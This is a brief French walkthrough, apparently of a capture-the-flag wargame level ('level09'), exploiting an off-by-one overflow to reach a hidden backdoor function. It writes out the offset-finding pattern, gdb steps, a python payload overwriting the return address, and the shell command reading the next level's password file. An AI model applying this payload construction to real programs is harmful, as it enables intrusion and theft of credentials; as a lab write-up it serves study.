 
Le premier champ n'accepte que 40 caractère mais la boucle ce fait sur 41 caractère donc en ajouter une grande valeur via un hexa, donc sur 1 octet nous pouvons l'overflow.


Pour trouver l'offset de la seconde string : 

python -c "prit 'A' * 40 + '\xDD' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A'"

Lors du segfault on peut voir qvec gdb qu'il reste dans rpb : "gA5gA4gA" soit "Ag4Ag5Ag" donc l'offset est de 200, il nous reste plus qu;a ajouter l'addresse de notre secret backdoor.

(gdb) : ./level09
(gdb) : start
(gdb) : info secret_backdoor
(gdb) : quit
python -c 'print "A" * 40 + "\xDD" ; print "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' > /tmp/level09
															[secret_backdoor address]
cat /tmp/level09 - | ./level09
/bin/sh
cat  /home/users/end/.pass
